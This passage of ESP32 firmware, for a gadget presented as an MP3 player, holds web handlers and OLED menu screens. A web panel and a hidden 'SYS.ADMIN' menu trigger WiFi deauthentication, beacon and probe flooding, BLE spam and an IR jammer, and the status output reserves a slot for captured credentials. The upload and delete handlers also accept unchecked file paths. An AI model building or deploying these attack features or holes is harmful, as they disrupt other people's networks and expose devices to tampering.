static void hAtkScanResults(){
    String j = "{\"ready\":"; j += (scanReady ? "true" : "false");
    j += ",\"aps\":[";
    if (scanReady) {
        for (int i = 0; i < apCount; i++) {
            if (i) j += ',';
            j += "{\"idx\":"; j += i;
            j += ",\"ssid\":\"";  j += aps[i].ssid;  j += "\"";
            j += ",\"bssid\":\""; j += aps[i].bssid; j += "\"";
            j += ",\"rssi\":"; j += aps[i].rssi;
            j += ",\"ch\":";   j += aps[i].channel;
            j += "}";
        }
    }
    j += "],\"count\":"; j += (scanReady ? apCount : 0);
    j += "}";
    ledServer.send(200, "application/json", j);
}
static void hAtkCmd(){
    String c = ledServer.arg("cmd");
    if      (c == "beacon") { WebCmd wc(WebCmd::ATK_BEACON); xQueueSend(cmdQueue, &wc, 0); }
    else if (c == "probe")  { WebCmd wc(WebCmd::ATK_PROBE);  xQueueSend(cmdQueue, &wc, 0); }
    else if (c == "stop")   { WebCmd wc(WebCmd::ATK_STOP);   xQueueSend(cmdQueue, &wc, 0); }
    else if (c == "deauth") { WebCmd wc(WebCmd::ATK_DEAUTH, ledServer.arg("idx").toInt()); xQueueSend(cmdQueue, &wc, 0); }
    else { ledServer.send(400, "text/plain", "bad"); return; }
    ledServer.send(200, "text/plain", "OK");
}
static void hAtkStatus(){
    String j = "{\"running\":"; j += (atkRun ? "true" : "false");
    j += ",\"packets\":"; j += atkPkts;
    j += ",\"creds\":[]}";
    ledServer.send(200, "application/json", j);
}
static void hEmergency(){
    ledServer.send(200, "text/plain", "OK");
    delay(50);
    stopAttack(); stopSong();
    WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF);
    webRunning = false;
    g.mode = M_MAIN; g.mainSel = 0;
}
static void hFwUpload(){
    HTTPUpload& u = ledServer.upload();
    static File fwF;
    if (u.status == UPLOAD_FILE_START) {
        if (!SD.exists("/update")) SD.mkdir("/update");
        fwF = SD.open(UPDATE_FILE, FILE_WRITE);
    } else if (u.status == UPLOAD_FILE_WRITE) {
        if (fwF) fwF.write(u.buf, u.currentSize);
    } else if (u.status == UPLOAD_FILE_END) {
        if (fwF) fwF.close();
    }
}
static void hFwUploadDone(){ ledServer.send(200, "text/plain", "OK"); }
static void hFwReboot(){
    ledServer.send(200, "text/plain", "Rebooting...");
    delay(300);
    ESP.restart();
}

// ═══════════════════════════════════════════════════════════
//  ANIMATION UPLOAD / LIST / DELETE
// ═══════════════════════════════════════════════════════════
static File animUpF;

static void hAnimStudio() {
    ledServer.send_P(200, "text/html", ANIM_STUDIO_HTML);
}

static void hAnimUpload() {
    HTTPUpload& u = ledServer.upload();
    if (u.status == UPLOAD_FILE_START) {
        if (!SD.exists(ANIM_DIR)) SD.mkdir(ANIM_DIR);
        String path = String(ANIM_DIR) + "/" + u.filename;
        animUpF = SD.open(path.c_str(), FILE_WRITE);
        Serial.printf("[ANIM] Receiving %s\n", u.filename.c_str());
    } else if (u.status == UPLOAD_FILE_WRITE) {
        if (animUpF) animUpF.write(u.buf, u.currentSize);
    } else if (u.status == UPLOAD_FILE_END) {
        if (animUpF) animUpF.close();
        Serial.printf("[ANIM] Saved %u bytes\n", u.totalSize);
    }
}

static void hAnimUploadDone() {
    ledServer.send(200, "text/plain", "OK");
}

static void hAnimList() {
    String j = "{\"anims\":[";
    File dir = SD.open(ANIM_DIR, FILE_READ);
    bool first = true;
    if (dir) {
        File f = dir.openNextFile();
        while (f) {
            if (!f.isDirectory()) {
                if (!first) j += ',';
                j += "{\"name\":\""; j += String(f.name());
                j += "\",\"size\":"; j += (uint32_t)f.size(); j += "}";
                first = false;
            }
            f = dir.openNextFile();
        }
        dir.close();
    }
    j += "]}";
    ledServer.send(200, "application/json", j);
}

static void hAnimDelete() {
    String n = ledServer.arg("name");
    if (n.length() == 0) { ledServer.send(400, "text/plain", "no name"); return; }
    String p = String(ANIM_DIR) + "/" + n;
    if (SD.remove(p.c_str())) ledServer.send(200, "text/plain", "OK");
    else ledServer.send(500, "text/plain", "fail");
}

static void startWeb(){
    if (webRunning) return;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL);
    ledServer.on("/",                   hLedRoot);
    ledServer.on("/led",                hLedCmd);
    ledServer.on("/music",              hMusicCmd);
    ledServer.on("/music/list",         hMusicList);
    ledServer.on("/files",              hFileRoot);
    ledServer.on("/files/list",         hFileList);
    ledServer.on("/files/delete",       HTTP_POST, hFileDelete);
    ledServer.on("/files/download",     hFileDownload);
    ledServer.on("/files/upload",       HTTP_POST, [](){ ledServer.send(200,"text/plain","OK"); }, hFileUpload);
    ledServer.on("/attacks",            hAtkRoot);
    ledServer.on("/atk/scan",           hAtkScan);
    ledServer.on("/atk/scanresults",    hAtkScanResults);
    ledServer.on("/atk/cmd",            hAtkCmd);
    ledServer.on("/atk/status",         hAtkStatus);
    ledServer.on("/atk/emergency",      HTTP_POST, hEmergency);
    ledServer.on("/firmware/upload",    HTTP_POST, hFwUploadDone, hFwUpload);
    ledServer.on("/firmware/reboot",    HTTP_POST, hFwReboot);
    ledServer.on("/anim",               hAnimStudio);
    ledServer.on("/anim/list",          hAnimList);
    ledServer.on("/anim/delete",        HTTP_POST, hAnimDelete);
    ledServer.on("/anim/upload",        HTTP_POST, hAnimUploadDone, hAnimUpload);
    ledServer.begin();
    webRunning = true;
}
static void stopWeb(){
    if (!webRunning) return;
    ledServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    webRunning = false;
}

static void wakeDisplay(){
    lastActivity = millis();
    if (displayOff) { displayOff = false; display.ssd1306_command(SSD1306_DISPLAYON); }
}
static void checkSleep(){
    if (!g.displaySleepEnabled || displayOff) return;
    if (millis() - lastActivity > 30000) {
        displayOff = true;
        display.clearDisplay(); display.display();
        display.ssd1306_command(SSD1306_DISPLAYOFF);
    }
}
static void drawBatteryDark(int x,int y){
    display.drawRect(x,y,16,9,BLACK);
    display.fillRect(x+16,y+3,2,3,BLACK);
    int f=(g.batteryPct*12)/100;
    if(f>0) display.fillRect(x+2,y+2,f,5,BLACK);
}
static void drawBatteryLight(int x,int y){
    display.drawRect(x,y,16,9,WHITE);
    display.fillRect(x+16,y+3,2,3,WHITE);
    int f=(g.batteryPct*12)/100;
    if(f>0) display.fillRect(x+2,y+2,f,5,WHITE);
}
static void hdr(const char* t){
    display.fillRect(0,0,SCR_W,13,WHITE);
    display.setTextColor(BLACK);
    display.setTextSize(1);
    display.setCursor(4,3);
    display.print(t);
    drawBatteryDark(SCR_W-22,2);
    display.setTextColor(WHITE);
}
static void hdrL(const char* t){
    display.drawFastHLine(0,0,SCR_W,WHITE);
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(4,5);
    display.print(t);
    drawBatteryLight(SCR_W-22,4);
}

static void iPlay(int x,int y,uint16_t c){display.fillTriangle(x+2,y+1,x+2,y+7,x+7,y+4,c);}
static void iMusic(int x,int y,uint16_t c){display.fillCircle(x+2,y+5,2,c);display.drawFastVLine(x+3,y+1,5,c);display.drawPixel(x+4,y+1,c);display.drawPixel(x+5,y+1,c);display.drawPixel(x+6,y+2,c);display.drawPixel(x+6,y+3,c);display.drawPixel(x+5,y+3,c);}
static void iBT(int x,int y,uint16_t c){display.drawFastVLine(x+4,y,8,c);display.drawLine(x+4,y,x+6,y+2,c);display.drawLine(x+6,y+2,x+2,y+4,c);display.drawLine(x+4,y+7,x+6,y+5,c);display.drawLine(x+6,y+5,x+2,y+3,c);}
static void iGame(int x,int y,uint16_t c){display.drawRect(x,y+1,8,6,c);display.drawPixel(x+2,y+3,c);display.drawPixel(x+1,y+4,c);display.drawPixel(x+2,y+4,c);display.drawPixel(x+3,y+4,c);display.drawPixel(x+2,y+5,c);display.drawPixel(x+5,y+3,c);display.drawPixel(x+5,y+5,c);}
static void iLED(int x,int y,uint16_t c){display.drawCircle(x+4,y+3,3,c);display.fillRect(x+3,y+6,3,2,c);display.drawPixel(x+4,y+3,c);}
static void iFlash(int x,int y,uint16_t c){display.fillRect(x+2,y,4,3,c);display.fillRect(x+3,y+3,2,5,c);display.drawPixel(x,y,c);display.drawPixel(x+7,y,c);}
static void iWifi(int x,int y,uint16_t c){display.drawPixel(x+2,y,c);display.drawPixel(x+3,y,c);display.drawPixel(x+4,y,c);display.drawPixel(x+5,y,c);display.drawPixel(x+1,y+1,c);display.drawPixel(x+6,y+1,c);display.drawPixel(x,y+2,c);display.drawPixel(x+7,y+2,c);display.drawPixel(x+2,y+3,c);display.drawPixel(x+3,y+3,c);display.drawPixel(x+4,y+3,c);display.drawPixel(x+5,y+3,c);display.drawPixel(x+1,y+4,c);display.drawPixel(x+6,y+4,c);display.drawPixel(x+3,y+5,c);display.drawPixel(x+4,y+5,c);display.fillRect(x+3,y+6,2,2,c);}

static void iPlayL(int x,int y,uint16_t c){display.fillTriangle(x+4,y+2,x+4,y+14,x+14,y+8,c);}
static void iMusicL(int x,int y,uint16_t c){display.fillCircle(x+4,y+11,3,c);display.fillCircle(x+11,y+9,3,c);display.drawFastVLine(x+6,y+3,8,c);display.drawFastVLine(x+13,y+1,8,c);display.drawFastHLine(x+6,y+1,8,c);display.drawFastHLine(x+6,y+2,8,c);}
static void iBTL(int x,int y,uint16_t c){display.drawFastVLine(x+8,y,16,c);display.drawLine(x+8,y,x+14,y+4,c);display.drawLine(x+14,y+4,x+2,y+11,c);display.drawLine(x+8,y+15,x+14,y+11,c);display.drawLine(x+14,y+11,x+2,y+4,c);}
static void iGameL(int x,int y,uint16_t c){display.drawRoundRect(x,y+2,16,12,4,c);display.drawPixel(x+3,y+7,c);display.drawPixel(x+5,y+7,c);display.drawPixel(x+4,y+6,c);display.drawPixel(x+4,y+8,c);display.fillCircle(x+12,y+8,2,c);display.fillCircle(x+12,y+5,2,c);}
static void iLEDL(int x,int y,uint16_t c){display.drawCircle(x+8,y+6,5,c);display.fillRect(x+6,y+12,5,4,c);display.drawPixel(x+8,y+6,c);display.drawPixel(x+6,y+5,c);display.drawPixel(x+10,y+5,c);}
static void iFlashL(int x,int y,uint16_t c){display.fillRect(x+5,y,6,5,c);display.fillRect(x+6,y+5,4,11,c);display.drawLine(x,y,x+3,y+3,c);display.drawLine(x+15,y,x+12,y+3,c);}

static void sBoot(){
    static int step = 0; static unsigned long lastMs = 0; static int w = 0;
    const char* n = "SOUMYA"; unsigned long now = millis();
    if (step == 0) { display.clearDisplay(); display.display(); lastMs = now; step = 1; return; }
    if (step >= 1 && step <= 6) {
        if (now - lastMs > 200) {
            display.clearDisplay(); display.setTextSize(2); display.setTextColor(WHITE);
            for (int i = 0; i < step; i++) { display.setCursor(22+i*15, 20); display.print(n[i]); }
            if (step < 6) display.fillRect(22 + step*15, 20, 2, 16, WHITE);
            display.display(); lastMs = now; step++;
        }
    } else if (step == 7) {
        if (now - lastMs > 400) { display.fillRect(22+6*15, 20, 2, 16, BLACK); display.display(); lastMs = now; step++; }
    } else if (step >= 8 && step <= 36) {
        if (now - lastMs > 30) {
            display.clearDisplay(); display.setTextSize(2); display.setTextColor(WHITE);
            for (int i = 0; i < 6; i++) { display.setCursor(22+i*15, 20); display.print(n[i]); }
            display.drawFastHLine(22, 42, w, WHITE);
            display.display(); w += 3; lastMs = now; step++;
        }
    } else if (step == 37) {
        if (now - lastMs > 400) { g.mode = M_MAIN; g.mainSel = 0; step = 0; w = 0; }
    }
}

const char* MAIN_IT[] = {"Play","Songs","Bluetooth","Games","LED Effects","Flashlight"};
static void sMain(){
    const int count = 6;
    smTick(M_MAIN, g.mainSel, g.mainSel);
    display.clearDisplay(); hdr("MP3 PLAYER");
    int cx = SCR_W/2, cy = 36, spacing = 50;
    for (int idx = 0; idx < count; idx++) {
        float dx = (idx - smSel) * spacing;
        int x = cx + (int)dx;
        if (x > -30 && x < SCR_W + 30) {
            float dist = fabsf((float)idx - smSel);
            bool isCenter = dist < 0.7f;
            if (isCenter) {
                display.fillRoundRect(x-20, cy-18, 40, 34, 8, WHITE);
                uint16_t c = BLACK;
                int bx = x-8, by = cy-10;
                switch (idx) {
                    case 0: iPlayL(bx,by,c); break; case 1: iMusicL(bx,by,c); break;
                    case 2: iBTL(bx,by,c);   break; case 3: iGameL(bx,by,c);  break;
                    case 4: iLEDL(bx,by,c);  break; case 5: iFlashL(bx,by,c); break;
                }
                display.setTextColor(WHITE);
                int tw = strlen(MAIN_IT[idx]) * 6;
                display.setCursor(cx - tw/2, 54); display.print(MAIN_IT[idx]);
            } else {
                display.drawRoundRect(x-12, cy-10, 24, 20, 5, WHITE);
                uint16_t c = WHITE;
                int ix = x-4, iy = cy-8;
                switch (idx) {
                    case 0: iPlay(ix,iy,c); break; case 1: iMusic(ix,iy,c); break;
                    case 2: iBT(ix,iy,c);   break; case 3: iGame(ix,iy,c);  break;
                    case 4: iLED(ix,iy,c);  break; case 5: iFlash(ix,iy,c); break;
                }
            }
        }
    }
    display.display();
}

static void sSongs(){
    const int visRows = 3, rowH = 16, baseY = 20;
    int targetOffset = 0;
    if (g.subSel >= 2) targetOffset = g.subSel - 1;
    if (targetOffset + visRows > songCount) targetOffset = songCount - visRows;
    if (targetOffset < 0) targetOffset = 0;
    smTick(M_SONGS, g.subSel, targetOffset);
    display.clearDisplay();
    int idxLo = (int)floorf(smScroll) - 1;
    int idxHi = (int)floorf(smScroll) + visRows + 1;
    for (int si = idxLo; si <= idxHi; si++) {
        if (si < 0 || si >= songCount) continue;
        int y = (int)roundf(baseY + (si - smScroll) * rowH);
        bool s = fabsf((float)si - (smSel - 1.0f)) < 0.7f;
        if (s) { display.fillRoundRect(8, y, SCR_W-16, rowH-2, 6, WHITE); display.setTextColor(BLACK); iMusic(12, y+3, BLACK); }
        else   { display.drawRoundRect(10, y, SCR_W-20, rowH-2, 6, WHITE); display.setTextColor(WHITE); iMusic(14, y+3, WHITE); }
        char b[20]; snprintf(b, sizeof(b), "%.16s", songName(si).c_str());
        display.setCursor(24, y+4); display.print(b);
    }
    display.fillRect(0, 0, SCR_W, baseY-2, BLACK);
    hdr("TRACKS");
    bool wf = smSel < 0.5f;
    if (wf) display.fillRoundRect(2, 14, 20, 10, 3, WHITE);
    iWifi(8, 15, wf ? BLACK : WHITE);
    display.display();
}

static void sPlayer(){
    display.clearDisplay();
    display.drawRoundRect(4, 18, 24, 24, 4, WHITE);
    iMusic(12, 26, WHITE);
    display.setTextColor(WHITE); display.setTextSize(1);
    String n = songName(g.currentSong);
    char t[16]; strncpy(t, n.c_str(), 14); t[14] = 0;
    display.setCursor(34, 20); display.print(t);
    display.setCursor(34, 30); display.print(g.isPlaying ? "Playing" : "Paused");
    for (int i = 0; i < 4; i++) {
        int h = 2 + ((animFrame * (i+1)) % 12);
        display.fillRect(100 + i*5, 42 - h, 3, h, WHITE);
    }
    display.drawRoundRect(4, 50, 120, 4, 2, WHITE);
    int fw = (animFrame/2) % 120;
    display.fillRoundRect(4, 50, fw, 4, 2, WHITE);
    hdrL("PLAYING");
    display.display();
}

const char* BT_M[] = {"Scan Devices","Connect Last","Forget Saved"};
static void sBtMenu(){
    const int count = 3, rowH = 12, baseY = 16;
    smTick(M_BT_MENU, g.subSel, 0);
    display.clearDisplay(); hdr("BLUETOOTH");
    float pillY = baseY + smSel * rowH;
    display.fillRoundRect(0, (int)roundf(pillY), SCR_W, rowH-1, 3, WHITE);
    for (int idx = 0; idx < count; idx++) {
        int y = baseY + idx * rowH;
        bool s = fabsf((float)idx - smSel) < 0.7f;
        uint16_t c = s ? BLACK : WHITE;
        display.setTextColor(c);
        display.fillTriangle(2, y+5, 5, y+2, 5, y+8, c);
        iBT(10, y+2, c);
        display.setCursor(22, y+3); display.print(BT_M[idx]);
    }
    display.setTextColor(WHITE); display.display();
}

static void sBtScan(){
    display.clearDisplay(); hdrL("SCANNING");
    int cx = SCR_W/2, cy = 34;
    for (int ring = 0; ring < 3; ring++) {
        int r = ((animFrame * 2) + ring * 15) % 45;
        if (r < 4) continue;
        uint16_t c = (r < 15) ? WHITE : (r < 30) ? 0x7BEF : 0x39E7;
        display.drawCircle(cx, cy, r, c);
        if (r > 8) display.drawCircle(cx, cy, r-1, c);
    }
    display.fillCircle(cx, cy, 3, WHITE);
    float ang = animFrame * 0.12f;
    for (int len = 6; len < 40; len += 2) {
        int sx = cx + (int)(cosf(ang) * len);
        int sy = cy + (int)(sinf(ang) * len);
        if (sx >= 0 && sx < SCR_W && sy >= 20 && sy < 56) {
            display.drawPixel(sx, sy, WHITE);
            if (len < 25) display.drawPixel(sx-1, sy, 0x7BEF);
        }
    }
    for (int i = 0; i < btDevCount; i++) {
        uint16_t s = i * 7919 + 100;
        int a = (s * 13) % 360;
        int r = 12 + ((s * 5) % 25);
        float rad = a * 3.14159f / 180.0f;
        int bx = cx + (int)(cosf(rad) * r);
        int by = cy + (int)(sinf(rad) * r);
        if (bx >= 0 && bx < SCR_W && by >= 20 && by < 56)
            if ((animFrame + i*5) % 12 < 8) {
                display.fillCircle(bx, by, 2, WHITE);
                display.drawCircle(bx, by, 3, 0x39E7);
            }
    }
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(4, 4); display.print("SEARCHING");
    for (int i = 0; i < 4; i++) {
        int barH = 2 + i * 2;
        int x = SCR_W - 30 + i * 5;
        int y = 12 - barH;
        if ((animFrame/3) % 5 > i) display.fillRect(x, y, 3, barH, WHITE);
        else display.drawRect(x, y, 3, barH, 0x39E7);
    }
    display.setCursor(SCR_W - 26, 4); display.print(btDevCount);
    display.setCursor(4, 57);
    if (btScanning) {
        int dots = (animFrame/4) % 4;
        display.print("Scanning");
        for (int i = 0; i < dots; i++) display.print(".");
    } else {
        display.print(btDevCount > 0 ? "SEL: view" : "No devices");
    }
    display.display();
}

static void sBtDev(){
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(4, 4);
    char hb[24]; snprintf(hb, sizeof(hb), "Devices %d/%d", btSel + 1, btDevCount);
    display.print(hb);
    int start = (btSel > 2) ? (btSel - 2) : 0;
    int y = 18;
    for (int i = start; i < btDevCount && y < 60; i++, y += 12) {
        bool s = (i == btSel);
        if (s) display.fillRect(0, y-1, SCR_W, 12, WHITE);
        display.setTextColor(s ? BLACK : WHITE);
        display.setCursor(2, y+1);
        char b[20]; snprintf(b, sizeof(b), "%.16s", btDevs[i].name);
        display.print(b);
        display.setCursor(SCR_W - 26, y+1);
        char r[6]; snprintf(r, sizeof(r), "%d", btDevs[i].rssi);
        display.print(r);
    }
    display.display();
}

static void sBtConn(){
    display.clearDisplay();
    int cx = SCR_W/2, cy = 32, hexR = 20;
    float elapsed = (millis() - btConnectStart) / 1000.0f;
    float t = elapsed / 4.0f; if (t > 1.0f) t = 1.0f;
    float eased = t - 1.0f; eased = eased*eased*eased + 1.0f;
    int prog = (int)roundf(eased * 100.0f);

    float angleStep = 6.2832f / 6.0f;
    for (int i = 0; i < 6; i++) {
        float a1 = i * angleStep - 1.5708f;
        float a2 = (i + 1) * angleStep - 1.5708f;
        int x1 = cx + (int)(cosf(a1) * hexR);
        int y1 = cy + (int)(sinf(a1) * hexR);
        int x2 = cx + (int)(cosf(a2) * hexR);
        int y2 = cy + (int)(sinf(a2) * hexR);
        display.drawLine(x1, y1, x2, y2, 0x39E7);
    }
    float totalAngle = (prog / 100.0f) * 6.2832f;
    for (float a = -1.5708f; a < -1.5708f + totalAngle; a += 0.08f) {
        int px = cx + (int)(cosf(a) * (hexR + 4));
        int py = cy + (int)(sinf(a) * (hexR + 4));
        display.drawPixel(px, py, WHITE);
        display.drawPixel(px + 1, py, WHITE);
    }
    display.drawCircle(cx, cy, hexR + 4, 0x18E3);

    if (a2dpConnected) {
        display.drawLine(cx - 8, cy, cx - 3, cy + 5, WHITE);
        display.drawLine(cx - 7, cy, cx - 3, cy + 4, WHITE);
        display.drawLine(cx - 3, cy + 5, cx + 8, cy - 6, WHITE);
        display.drawLine(cx - 3, cy + 4, cx + 7, cy - 6, WHITE);
    } else {
        int bx = cx - 4, by = cy - 4;
        display.drawFastVLine(bx + 4, by, 8, WHITE);
        display.drawLine(bx + 4, by, bx + 6, by + 2, WHITE);
        display.drawLine(bx + 6, by + 2, bx + 2, by + 4, WHITE);
        display.drawLine(bx + 4, by + 7, bx + 6, by + 5, WHITE);
        display.drawLine(bx + 6, by + 5, bx + 2, by + 3, WHITE);
    }

    display.fillRect(0, 0, SCR_W, 13, BLACK);
    display.setTextSize(1); display.setTextColor(WHITE);
    const char* name = (btConnectTarget >= 0 && btConnectTarget < btDevCount)
                        ? btDevs[btConnectTarget].name : "...";
    char nb[18]; snprintf(nb, sizeof(nb), "%.20s", name);
    int nw = strlen(nb) * 6;
    display.setCursor((SCR_W - nw) / 2, 4); display.print(nb);

    char pbuf[8]; snprintf(pbuf, sizeof(pbuf), "%d%%", prog);
    display.setCursor(4, 57); display.print(pbuf);

    const char* st = a2dpStreaming ? "STREAMING" :
                     (a2dpConnected ? "CONNECTED" : "CONNECTING");
    int sw = strlen(st) * 6;
    display.setCursor(SCR_W - sw - 4, 57); display.print(st);

    if (a2dpConnected && elapsed > 5.0f) {
        g.mode = M_BT_MENU; g.subSel = 0; btConnectTarget = -1;
    }
    display.display();
}

const char* LED_M[] = {"Effects","Music Sync","Brightness","WiFi Control"};
static void sLedMenu(){
    const int count = 4, rowH = 11, baseY = 16;
    smTick(M_LED_MENU, g.subSel, 0);
    display.clearDisplay(); hdr("LED EFFECTS");
    float pillY = baseY + smSel * rowH;
    display.fillRoundRect(0, (int)roundf(pillY), SCR_W, rowH-1, 3, WHITE);
    for (int idx = 0; idx < count; idx++) {
        int y = baseY + idx * rowH;
        bool s = fabsf((float)idx - smSel) < 0.7f;
        uint16_t c = s ? BLACK : WHITE;
        display.setTextColor(c);
        display.fillTriangle(2, y+5, 5, y+2, 5, y+8, c);
        if (idx == 3) iWifi(9, y+1, c); else iLED(9, y+1, c);
        display.setCursor(21, y+2); display.print(LED_M[idx]);
    }
    display.setTextColor(WHITE); display.display();
}

const char* FX[] = {"Solid","Rainbow","Breathe","Chase"};
static void sLedFx(){
    const int count = 4, rowH = 11, baseY = 16;
    smTick(M_LED_FX, g.subSel, 0);
    display.clearDisplay(); hdr("EFFECTS");
    float pillY = baseY + smSel * rowH;
    display.fillRoundRect(0, (int)roundf(pillY), SCR_W, rowH-1, 3, WHITE);
    for (int idx = 0; idx < count; idx++) {
        int y = baseY + idx * rowH;
        bool s = fabsf((float)idx - smSel) < 0.7f;
        display.setTextColor(s ? BLACK : WHITE);
        display.setCursor(12, y+2); display.print(FX[idx]);
    }
    display.setTextColor(WHITE); display.display();
}

static void sLedBright(){
    display.clearDisplay(); hdrL("BRIGHTNESS");
    int pct = (g.ledBright * 100) / 255;
    display.setTextSize(3); display.setTextColor(WHITE);
    char b[8]; snprintf(b, sizeof(b), "%d%%", pct);
    int tw = strlen(b) * 18;
    display.setCursor((SCR_W - tw)/2, 22); display.print(b);
    display.drawRect(6, 52, SCR_W-12, 8, WHITE);
    int fw = (g.ledBright * (SCR_W-16)) / 255;
    if (fw > 0) display.fillRect(8, 54, fw, 4, WHITE);
    display.display();
}

static void sLedWifi(){
    display.clearDisplay(); hdrL("WIFI CONTROL");
    int cx = SCR_W/2, cy = 30;
    display.fillCircle(cx, cy+10, 3, WHITE);
    for (int arc = 0; arc < 3; arc++) {
        int r = 8 + arc * 7;
        if ((animFrame/3 + arc) % 4 < 3)
            for (int a = 215; a <= 325; a += 6) {
                float rad = a * 3.14159f / 180.0f;
                display.fillCircle(cx + (int)(cosf(rad)*r), cy+10+(int)(sinf(rad)*r), 1, WHITE);
            }
    }
    display.setTextSize(1); display.setTextColor(WHITE);
    const char* t = webRunning ? "AP ACTIVE" : "AP OFF";
    int tw = strlen(t) * 6;
    display.setCursor((SCR_W - tw)/2, 52); display.print(t);
    if (webRunning) { display.setCursor(4, 58); display.print("192.168.4.1"); }
    display.display();
}

static void sFlash(){
    const int count = 5, rowH = 11, baseY = 16;
    int targetOffset = (g.subSel >= 3) ? (g.subSel - 2) : 0;
    if (targetOffset + 4 > count) targetOffset = 1;
    if (targetOffset < 0) targetOffset = 0;
    smTick(M_FLASH_MENU, g.subSel, targetOffset);
    display.clearDisplay();
    display.drawFastHLine(0, 0, SCR_W, WHITE);
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(4, 5);
    display.print(g.flashOn ? "FLASHLIGHT [ON]" : "FLASHLIGHT [OFF]");
    drawBatteryLight(SCR_W-22, 4);
    const char* it[] = {"Power: ON","Bright: 75%","Color: White","Effect: Solid","Done"};
    float pillY = baseY + (smSel - smScroll) * rowH;
    if (pillY > baseY - rowH && pillY < baseY + 4 * rowH)
        display.fillRoundRect(0, (int)roundf(pillY), SCR_W, rowH-1, 3, WHITE);
    int idxLo = (int)floorf(smScroll) - 1;
    int idxHi = (int)floorf(smScroll) + 5;
    for (int idx = idxLo; idx <= idxHi; idx++) {
        if (idx < 0 || idx >= count) continue;
        float yf = baseY + (idx - smScroll) * rowH;
        if (yf < baseY - rowH || yf > baseY + 4 * rowH) continue;
        int y = (int)roundf(yf);
        bool s = fabsf((float)idx - smSel) < 0.7f;
        uint16_t c = s ? BLACK : WHITE;
        display.setTextColor(c);
        display.fillTriangle(2, y+5, 5, y+2, 5, y+8, c);
        iFlash(9, y+1, c);
        display.setCursor(21, y+2); display.print(it[idx]);
    }
    display.setTextColor(WHITE); display.display();
}

const char* SET_M[] = {"Display Sleep","Screen Bright","Auto BT","Device Info","Factory Reset"};
static void sSettings(){
    const int count = 5, rowH = 11, baseY = 16;
    int targetOffset = (g.subSel >= 3) ? (g.subSel - 2) : 0;
    if (targetOffset + 4 > count) targetOffset = 1;
    if (targetOffset < 0) targetOffset = 0;
    smTick(M_SETTINGS, g.subSel, targetOffset);
    display.clearDisplay(); hdr("SETTINGS");
    float pillY = baseY + (smSel - smScroll) * rowH;
    if (pillY > baseY - rowH && pillY < baseY + 4 * rowH)
        display.fillRoundRect(0, (int)roundf(pillY), SCR_W, rowH-1, 3, WHITE);
    int idxLo = (int)floorf(smScroll) - 1;
    int idxHi = (int)floorf(smScroll) + 5;
    for (int idx = idxLo; idx <= idxHi; idx++) {
        if (idx < 0 || idx >= count) continue;
        float yf = baseY + (idx - smScroll) * rowH;
        if (yf < baseY - rowH || yf > baseY + 4 * rowH) continue;
        int y = (int)roundf(yf);
        bool s = fabsf((float)idx - smSel) < 0.7f;
        display.setTextColor(s ? BLACK : WHITE);
        display.setCursor(12, y+2); display.print(SET_M[idx]);
    }
    display.setTextColor(WHITE); display.display();
}

static void sInfo(){
    display.clearDisplay(); hdrL("DEVICE INFO");
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(4, 18); display.print("SOUMYA Gadget v9.3");
    display.setCursor(4, 28); display.print("ESP32-WROOM-32");
    char u[24]; snprintf(u, sizeof(u), "Up: %lu min", millis()/60000UL);
    display.setCursor(4, 38); display.print(u);
    char s[24]; snprintf(s, sizeof(s), "SD: %d songs", songCount);
    display.setCursor(4, 48); display.print(s);
    display.setCursor(4, 56); display.print(webRunning ? "AP: ON" : "AP: OFF");
    display.display();
}

static void sWifiFiles(){
    display.clearDisplay(); hdrL("WIFI FILES");
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(4, 18); display.print(webRunning ? "AP ACTIVE" : "AP OFF");
    if (webRunning) {
        display.setCursor(4, 30); display.print("SSID: ESP32-Gadget");
        display.setCursor(4, 40); display.print("URL : 192.168.4.1");
    }
    display.drawFastHLine(0, 50, SCR_W, 0x39E7);
    display.setCursor(4, 55); display.print("Browser -> upload MP3");
    display.display();
}

// ═══════════════════════════════════════════════════════════
//  Cyber menu (card-stack style)
// ═══════════════════════════════════════════════════════════
void drawCyberMenu(int sel, const char* title, const char** items, int count, int sceneID){
    const int CARD_W = 112, CARD_H = 14, CARD_STEP = 16, ANCHOR_Y = 26;
    smTick(sceneID, sel, sel);
    display.clearDisplay();
    hdr(title);
    int x = (SCR_W - CARD_W) / 2;
    for (int idx = 0; idx < count; idx++) {
        float yf = ANCHOR_Y + (idx - smSel) * CARD_STEP;
        int y = (int)roundf(yf);
        if (y + CARD_H < 14) continue;
        if (y > SCR_H - 6) continue;
        bool s = fabsf((float)idx - smSel) < 0.5f;
        int bob = s ? (int)(sinf(animFrame * 0.12f) * 1.0f) : 0;
        int dy = y + bob;
        if (s) {
            display.fillRoundRect(x, dy, CARD_W, CARD_H, 4, WHITE);
            display.setTextColor(BLACK);
            display.fillTriangle(x+5, dy+CARD_H/2, x+9, dy+CARD_H/2-3, x+9, dy+CARD_H/2+3, BLACK);
            display.setCursor(x+15, dy+(CARD_H-8)/2);
            display.print(items[idx]);
        } else {
            display.drawRoundRect(x, dy, CARD_W, CARD_H, 4, WHITE);
            display.setTextColor(WHITE);
            display.setCursor(x+15, dy+(CARD_H-8)/2);
            display.print(items[idx]);
        }
    }
    display.display();
}

const char* HID_M[] = {"WiFi Tools","BT Tools","IR Remote"};
static void sHidden(){ drawCyberMenu(g.subSel, "SYS.ADMIN", HID_M, 3, M_HIDDEN); }
const char* BT_T[] = {"BLE Scan","Classic Scan","BLE Spam"};
static void sBtT(){ drawCyberMenu(g.subSel, "BT_OPS", BT_T, 3, M_BT_TOOLS); }
const char* IR_M[] = {"Learn Code","Transmit Code","IR Jammer"};
static void sIrM(){ drawCyberMenu(g.subSel, "IR_OPS", IR_M, 3, M_IR_MENU); }

// ═══════════════════════════════════════════════════════════
//  WiFi AP List (radar scan + list)
// ═══════════════════════════════════════════════════════════
static void sWifiApList(){
    display.clearDisplay();
    display.fillRect(0, 0, SCR_W, 13, WHITE);
    display.setTextColor(BLACK);
    display.setTextSize(1);
    display.setCursor(4, 3);
    if (scanInProgress) {
        display.print("SCANNING");
